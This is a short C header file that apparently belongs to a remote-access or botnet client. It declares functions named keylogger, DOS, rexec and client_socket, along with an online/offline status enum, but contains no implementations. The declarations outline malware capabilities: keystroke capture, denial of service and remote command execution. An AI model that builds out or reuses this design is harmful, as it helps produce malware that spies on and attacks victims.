#ifndef CXENONh_H
#define CXENONh_H

#include "../Include/driver/socket.h"

#if defined(_WIN32)

int WININIT(void);

char* keylogger(void);
void DOS(void);

enum _USTATUS
{

	ONLINE=0x00,
	OFFLINE=0x01,
	UNKNOWN=0x02

};

#endif


SOCKET client_socket(void);
int clientBC(void);
int rexec(void);

#endif